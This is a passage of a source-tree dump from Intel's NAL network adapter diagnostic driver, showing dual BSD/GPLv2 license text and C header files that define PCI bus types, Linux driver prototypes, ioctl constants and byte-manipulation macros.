  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`source/IntelNal/inc/hwbus_t.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   hwbus_t.h
 *
 * Abstract:
 *   This file includes all the types required for the NAL hardware
 *   bus interface.
 *
 */


#ifndef _NAL_HWBUS_TYPES_H_
#define _NAL_HWBUS_TYPES_H_

#include "pci_t.h"
#include "cardbus_t.h"

#define NAL_MAX_BARS 6
#define NAL_DEVICE_SIGNATURE 0xA55A5AA5

#if defined(NAL_EFI)
typedef struct _NAL_OS_SLOT_ID
{
    PCI_SLOT_ID Pci;
    UINT32 Signature;
    VOID* Handle;
} NAL_OS_SLOT_ID;

#elif defined(NAL_LINUX)
typedef struct _NAL_OS_SLOT_ID
{
    PCI_SLOT_ID Pci;
    UINT32 Signature;
} NAL_OS_SLOT_ID;

#elif defined(NAL_SOLARIS)
typedef struct _NAL_OS_SLOT_ID
{
    PCI_SLOT_ID Pci;
    UINT32 Signature;
    INT32 DevInfo;
} NAL_OS_SLOT_ID;

#elif defined(NAL_DOS)
typedef struct _NAL_OS_SLOT_ID
{
    PCI_SLOT_ID Pci;
    UINT32 Signature;
} NAL_OS_SLOT_ID;

#elif defined(NAL_WINNT_WDM)
typedef struct _NAL_OS_SLOT_ID
{
    PCI_SLOT_ID Pci;
    CHAR RegistryKey[250];
    UINT32 Signature;
} NAL_OS_SLOT_ID;

#elif defined(NAL_WINNT4)
typedef struct _NAL_OS_SLOT_ID
{
    PCI_SLOT_ID Pci;
    UINT32 Signature;
} NAL_OS_SLOT_ID;

#else

#error "Undefined NAL Operating System in hwbus_t.h."
#endif

typedef union _VF_SLOT_ID
{
    struct
    {
        UINT32 SlotId;
        UINT32 ReservedForSignature;
        UINT32 ParentSlotId;
        UINT16 SupportedModule;
        BOOLEAN IsVirtualDevice;
        UINT8 Pad;
    } slot_id;
    struct
    {
        struct
        {
#if defined (NAL_BIG_ENDIAN)
            UINT32 DwordLo : 2;
            UINT32 _Byte : 2;
            UINT32 Reserved : 4;
            UINT32 DwordHi : 8;
            UINT32 Device : 7;
            UINT32 Function : 1;
            UINT32 Bus : 8;
#else
            UINT32 Bus : 8;
            UINT32 Device : 7;
            UINT32 Function : 1;
            UINT32 Dword : 10;
            UINT32 _Byte : 2;
            UINT32 Reserved : 4;
#endif
        } vf_slot_id;
        UINT32 ReservedForSignature;
        PCI_EXPRESS_SLOT_ID ParentDevice;
    };
} VF_SLOT_ID;

typedef union _NAL_DEVICE_LOCATION
{
    PCI_SLOT_ID Pci;
    PCI_EXPRESS_SLOT_ID PciExpress;
    VF_SLOT_ID Vf;
    CARDBUS_SLOT_ID Cardbus;
    NAL_OS_SLOT_ID OsDeviceLocation;
    UINT64 Reserved;
} NAL_DEVICE_LOCATION;

#pragma pack(1)
typedef struct _NAL_SUBST_DEVICE_TABLE
{
    UINT16 DeviceId;
    NAL_DEVICE_LOCATION DeviceLocation;
} NAL_SUBST_DEVICE_TABLE;

typedef struct _PCIEXP_CONFIG_STORE
{
    NAL_DEVICE_LOCATION DeviceLocation;
    PCI_EXPRESS_CONFIG_SPACE ConfigSpace;
}PCIEXP_CONFIG_STORE;

typedef enum _NAL_IO_RESOURCE_TYPE
{
    NAL_IO_TYPE_UNUSED = 0,
    NAL_IO_TYPE_IO,
    NAL_IO_TYPE_MEM
} NAL_IO_RESOURCE_TYPE;

typedef struct _NAL_IO_RESOURCE
{
    NAL_IO_RESOURCE_TYPE Type;
    NAL_PHYSICAL_ADDRESS MemoryAddress;
} NAL_IO_RESOURCE;

typedef struct _NAL_INTERRUPT_INFO
{
    BOOLEAN Valid;
    UINT32 Irq;
    UINT32 Vector;
    UINT32 Trigger;
    UINT32 Affinity;
    UINT32 Mode;
    UINT64 Reserved;
} NAL_INTERRUPT_INFO;

typedef enum _NAL_DEVICE_CLASS
{
    NAL_CLASS_LEGACY = 0,
    NAL_CLASS_STORAGE,
    NAL_CLASS_NETWORK,
    NAL_CLASS_DISPLAY,
    NAL_CLASS_MULTIMEDIA,
    NAL_CLASS_MEMORY_CONTROLLER,
    NAL_CLASS_BRIDGE_DEVICES,
    NAL_CLASS_SIMPLE_COMMUNICATION,
    NAL_CLASS_SYSTEM,
    NAL_CLASS_USB,
    NAL_CLASS_UNKNOWN = 0xFF
} NAL_DEVICE_CLASS;

typedef UINT8 NAL_DEVICE_SUBCLASS;

typedef struct _NAL_DEVICE
{
    UINT32 Signature;
    UINT16 VendorId;
    UINT16 DeviceId;
    UINT16 SubSystemId;
    UINT16 SubVendorId;
    UINT8 RevisionId;
    NAL_DEVICE_CLASS Class;
    NAL_DEVICE_SUBCLASS SubClass;
    UINT32 ResourceCount;
    NAL_IO_RESOURCE IoResource[NAL_MAX_BARS];
    NAL_INTERRUPT_INFO InterruptInfo;
    NAL_DEVICE_LOCATION DeviceLocation;
    BOOLEAN DeviceIsOsConfigured;
} NAL_DEVICE;
#pragma pack()

typedef struct _NAL_ADAPTER_VENDOR_INFO
{
    UINT16 Vendor;
    UINT16 Device;
    UINT16 SubVendor;
    UINT16 SubDevice;
    UINT8 Revision;
} NAL_ADAPTER_VENDOR_INFO;

#endif

```

`source/IntelNal/inc/linux/files.txt`:

```txt
This file describes in details which file in this folder is released under which license.
Full content of lincese is placed below the files' list.

linuxdriverdevice_i.h		- GPLv2
linuxnaldriver.h		- GPLv2/BSD
linuxnalioctl.h			- GPLv2/BSD
linuxos_i.h			- GPLv2/BSD
linuxpci_i.h			- GPLv2/BSD

  GPL LICENSE SUMMARY
  -------------------

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE
  -----------

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`source/IntelNal/inc/linux/linuxdriverdevice_i.h`:

```h
/*
 * Intel QV Linux kernel driver
 * Copyright (c) 1999 - 2013, Intel Corporation.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms and conditions of the GNU General Public License,
 * version 2, as published by the Free Software Foundation.
 *
 * This program is distributed in the hope it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
 *
 */

/*
 * Module Name:
 *   linuxdriverdevice_i.h
 *
 * Abstract:
 *   This file contains Linux Specific OS functions that are required
 * to correctly communicate with a device in Linux.
 */


#ifndef _LINUXDRIVERDEVICE_I_H_
#define _LINUXDRIVERDEVICE_I_H_

#include <naltypes.h>
#include <nalcodes.h>

BOOLEAN
_NalMarkAdapterInUse(
    IN NAL_DEVICE_LOCATION NalDevice,
    IN BOOLEAN Lock
    );

typedef struct _NAL_OS_SPECIFIC_DEVICE
{
    UINT32 ReferenceCount;
} NAL_OS_SPECIFIC_DEVICE;

#define _NalReadPortOs8(a,p) NalReadPort8(p)
#define _NalReadPortOs16(a,p) NalReadPort16(p)
#define _NalReadPortOs32(a,p) NalReadPort32(p)
#define _NalWritePortOs8(a,p,v) NalWritePort8(p,v)
#define _NalWritePortOs16(a,p,v) NalWritePort16(p,v)
#define _NalWritePortOs32(a,p,v) NalWritePort32(p,v)
#define _NalReadRegisterOs8(a,d) NalReadRegister8(d)
#define _NalReadRegisterOs16(a,d) NalReadRegister16(d)
#define _NalReadRegisterOs32(a,d) NalReadRegister32(d)
#define _NalWriteRegisterOs8(a,d,v) NalWriteRegister8(d,v)
#define _NalWriteRegisterOs16(a,d,v) NalWriteRegister16(d,v)
#define _NalWriteRegisterOs32(a,d,v) NalWriteRegister32(d,v)

KVOID*
_NalAllocateMemoryNonPagedPci(
    IN KVOID* PDev,
    IN UINT32 ByteCount,
    IN UINT32 Alignment,
    OUT NAL_PHYSICAL_ADDRESS* PhysicalAddress,
    IN CHAR* NamedLocator,
    IN UINT32 LineNumber
    );

VOID
NalFreeMemoryNonPagedPci(
    IN KVOID* PDev,
    IN KVOID* Address,
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress,
    IN UINT32 Size
    );

#endif

```

`source/IntelNal/inc/linux/linuxnaldriver.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 * Module Name:
 *   linuxnaldriver.h
 *
 * Abstract:
 *   This is the main header file for the memspi Linux driver modules.
 *
 */


#ifndef __LINUXNALDRIVER_H__
#define __LINUXNALDRIVER_H__

#ifdef NAL_LINUX_ANDROID
#define DRIVER_NAME "SPI Device Memmap Linux Driver"
#else
#define DRIVER_NAME "Nal Linux Driver"
#endif

#include <naltypes.h>
#include <nalcodes.h>
#include <hwbus_t.h>
#include <linux/fs.h>
#include <osdevice_i.h>
#include <os_i.h>
#include <linuxnalioctl.h>

#define NAL_DRIVER_MAX_ADAPTERS 256
#ifdef NAL_LINUX_ANDROID
#define NAL_LINUX_DRIVER_NAME "memspi"
#else
#define NAL_LINUX_DRIVER_NAME "nal"
#endif

#ifdef NAL_LINUX_ANDROID
#define DRIVER_MAJOR_VERSION 1
#define DRIVER_MINOR_VERSION 1
#define DRIVER_BUILD_NUMBER 0
#define DRIVER_FIX_NUMBER 1
#else
#define DRIVER_MAJOR_VERSION 1
#define DRIVER_MINOR_VERSION 1
#define DRIVER_BUILD_NUMBER 4
#define DRIVER_FIX_NUMBER 5
#endif

#ifndef MINOR_VERSION
#define MINOR_VERSION DRIVER_MINOR_VERSION
#endif

#if MINOR_VERSION < 10
#define _MAKE_VER_STRING(maj,min,build,fix) #maj ".0" #min "." #build "." #fix
#else
#define _MAKE_VER_STRING(maj,min,build,fix) #maj "." #min "." #build "." #fix
#endif
#define MAKE_VER_STRING(maj,min,submin,bld) _MAKE_VER_STRING(maj, min, submin, bld)

#define DRIVER_FILEVERSION DRIVER_MAJOR_VERSION,DRIVER_MINOR_VERSION,DRIVER_BUILD_NUMBER,DRIVER_FIX_NUMBER

#define DRIVER_FILEVERSION_STR LINUX_DRIVER_VERSION

#ifdef NAL_LINUX_ANDROID
#define DRIVER_FILEDESCRIPTION "Intel(R) SPI Device Memmap Linux Driver "
#else
#define DRIVER_FILEDESCRIPTION "Intel(R) Network Adapter Diagnostic Driver "
#endif
#define DRIVER_COMPANYNAME "Intel Corporation "
#define DRIVER_COPYRIGHT_YEARS "2002-2013 "
#define DRIVER_LEGALCOPYRIGHT "Copyright (C) " DRIVER_COPYRIGHT_YEARS DRIVER_COMPANYNAME "All Rights Reserved."

#define DRIVER_DESCRIPTION DRIVER_FILEDESCRIPTION DRIVER_FILEVERSION_STR

typedef struct _NAL_ADAPTER_IN_USE_TABLE
{
    NAL_DEVICE_LOCATION DeviceLocation;
    BOOLEAN InUse;
} NAL_ADAPTER_IN_USE_TABLE;

#define NAL_LINUX_MEMORY_ROUNDUP(i,size) ((i) = (((i) + (size) - 1) & ~((size) - 1)))

int
NalDeviceControl(
    struct inode* Inode,
    struct file* File,
    unsigned int Cmd,
    unsigned long Arg
    );

long
NalDeviceControlUnlockedIoctl(
    struct file* File,
    unsigned int Cmd,
    unsigned long Arg
    );

int
NalOpen(
    struct inode* Inode,
    struct file* File
    );

int
NalRelease(
    struct inode* Inode,
    struct file* File
    );

NAL_STATUS
_NalInitializeInterrupts(
    IN NAL_LINUX_ISR_DEVICE* NalIsrDevice
    );

NAL_STATUS
_NalUninitializeInterrupts(
    IN NAL_LINUX_ISR_DEVICE* NalIsrDevice
    );

BOOLEAN
_NalHasInterruptOccurred(
    IN NAL_LINUX_ISR_DEVICE* NalIsrDevice
    );

VOID
_NalDriverDecrementReferenceCount(
    VOID
    );

VOID
_NalDriverIncrementReferenceCount(
    VOID
    );

UINT32
_NalDriverGetReferenceCount(
    VOID
    );

VOID
_NalDriverGetVersion(
    OUT CHAR* Version
    );

#endif

```

`source/IntelNal/inc/linux/linuxnalioctl.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   linuxnalioctl.h
 *
 * Abstract:
 *   Contains the ioctl values for sharing between the user mode app
 *   and the iqvl32.o driver.
 *
 */


#ifndef __LINUXNALIOCTL_H__
#define __LINUXNALIOCTL_H__

#define DEVICE_NAL 0x8086

#define NAL_IOCTL_BASE 2049

#define NAL_MAKE_IOCTL(IoctlNumber) (NAL_IOCTL_BASE + IoctlNumber)

#ifdef NAL_LINUX_ANDROID
#define LINUX_DRIVER_VERSION "1.1.0.1"
#else
#define LINUX_DRIVER_VERSION "1.1.4.5"
#endif

#define NAL_LINUX_MAX_CONTIGUOUS_MEMORY_ALLOCATION (128 * 1024)

#endif

```

`source/IntelNal/inc/linux/linuxos_i.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   linuxos_i.h
 *
 * Abstract:
 *   This file contains Linux specific prototypes & variable types
 *
 */


#ifndef _LINUX_OSINTERFACE_H_
#define _LINUX_OSINTERFACE_H_

#ifndef NAL_DRIVER
#include <sys/time.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <ctype.h>
#endif

#define NAL_LINUX_MAX_PATH 260
#define NAL_LINUX_INTERRUPT_SIGNATURE 0xA5BABA5A

#define NAL_LINUX_CHILD_STACK_SIZE 0x100000

typedef struct _NAL_LINUX_ISR_DEVICE
{
    UINT32 Signature;
    BOOLEAN DeviceInterrupted;
    KVOID* HardwareVirtualAddress;
    UINT32 Irq;
    UINT32 MacType;
} NAL_LINUX_ISR_DEVICE;

#if !defined(NAL_DRIVER)
typedef pthread_t NAL_THREAD_ID;

typedef struct _NAL_LINUX_TIMER_OBJECT
{
    NAL_TIMER_CALLBACK Callback;
    UINT32 ThreadId;
    struct itimerval TimerVal;
    VOID* Context;
} NAL_LINUX_TIMER_OBJECT;

#endif

#ifndef HIBYTE
    #define HIBYTE(_x) (UINT8)(((_x)>>8)&0xFF)
#endif

#ifndef LOBYTE
    #define LOBYTE(_x) (UINT8)((_x)&0xFF)
#endif

#ifndef HIWORD
    #define HIWORD(_x) ((UINT16)(((_x)>>16)&0xFFFF))
#endif

#ifndef LOWORD
    #define LOWORD(_x) ((UINT16)((_x)&0xFFFF))
#endif

#define HIDWORD(_x) ((UINT32)(((_x)>>32)&0xFFFFFFFF))
#define LODWORD(_x) ((UINT32)((_x)&0xFFFFFFFF))

#define LOW_BYTE(word) LOBYTE(word)
#define HIGH_BYTE(word) HIBYTE(word)

#define LOW_WORD(dword) LOWORD(dword)
#define HIGH_WORD(dword) HIWORD(dword)

#define MAKE_DATA_WORD_TCP_CHECKSUM(hi,low) \
    ((UINT16) ((((UINT16)(hi)) << 8) | (low)))

#define MAKE_DATA_WORD_UDP_CHECKSUM(hi,low) \
    ((UINT16) ((((UINT16)(hi)) << 8) | (low)))

#define MAKE_QWORD(hi,low) \
    ((UINT64) ((((UINT64)(hi)) << 32) | (low)))

#if defined NAL_BIG_ENDIAN

#define MAKE_WORD(hi,low) \
    ((UINT16) ((((UINT16)(low)) << 8) | (hi)))

#define MAKE_DWORD(hi,low) \
    ((UINT32) ((((UINT32)(low)) << 16) | (hi)))

#define BYTE_SWAP_WORD(value) (UINT16)( (((UINT16)(value) & 0x00ff)) | \
                                            (((UINT16)(value) & 0xff00)) )

#define BYTE_SWAP_DWORD(dword) (UINT32)( (((UINT32)(dword) & 0x000000ff) << 24) | \
                                            (((UINT32)(dword) & 0x0000ff00) << 8) | \
                                            (((UINT32)(dword) & 0x00ff0000) >> 8) | \
                                            (((UINT32)(dword) & 0xff000000) >> 24) )

#define BYTE_SWAP_QWORD(_dest,_src) \
{ \
    ((UINT8*)_dest)[0] = ((UINT8*)_src)[7]; \
    ((UINT8*)_dest)[1] = ((UINT8*)_src)[6]; \
    ((UINT8*)_dest)[2] = ((UINT8*)_src)[5]; \
    ((UINT8*)_dest)[3] = ((UINT8*)_src)[4]; \
    ((UINT8*)_dest)[4] = ((UINT8*)_src)[3]; \
    ((UINT8*)_dest)[5] = ((UINT8*)_src)[2]; \
    ((UINT8*)_dest)[6] = ((UINT8*)_src)[1]; \
    ((UINT8*)_dest)[7] = ((UINT8*)_src)[0]; \
}

#define WORD_SWAP(dword) WORD_SWAP_DWORD(dword)

#define BYTE_SWAP(word) BYTE_SWAP_WORD(word)

#else

#define MAKE_WORD(hi,low) \
    ((UINT16) ((((UINT16)(hi)) << 8) | (low)))

#define MAKE_DWORD(hi,low) \
    ((UINT32) ((((UINT32)(hi)) << 16) | (low)))

#define BYTE_SWAP_WORD(value) (UINT16)( (((UINT16)(value) & 0x00ff) << 8) | \
                                            (((UINT16)(value) & 0xff00) >> 8) )

#define BYTE_SWAP_DWORD(dword) (UINT32)( (((UINT32)(dword) & 0x000000ff) << 24) | \
                                            (((UINT32)(dword) & 0x0000ff00) << 8) | \
                                            (((UINT32)(dword) & 0x00ff0000) >> 8) | \
                                            (((UINT32)(dword) & 0xff000000) >> 24) )

#define WORD_SWAP_DWORD(value) (UINT32)( (((UINT32)(value) & 0x0000FFFF) << 16) | \
                                            (((UINT32)(value) & 0xFFFF0000) >> 16) )

#define BYTE_SWAP_QWORD(_dest,_src) \
{ \
    ((UINT8*)_dest)[0] = ((UINT8*)_src)[7]; \
